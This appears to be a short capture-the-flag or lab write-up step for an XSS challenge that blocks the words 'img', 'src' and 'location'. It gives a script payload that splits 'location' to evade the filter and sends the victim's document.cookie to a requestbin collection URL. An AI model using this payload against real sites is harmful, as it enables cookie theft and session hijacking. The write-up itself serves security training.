# xss_2 - Injectable Body (no `img`, `src` or `location`, case insensitive)
- Create request bin as in xss_1.
- Construct payload avoiding filtered words, `<script>document['locat'+'ion']="http://requestbin.fullcontact.com/18kxbln1?c="+document.cookie;</script>`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528361462591_Screenshot+2018-06-07+01.50.32.png)
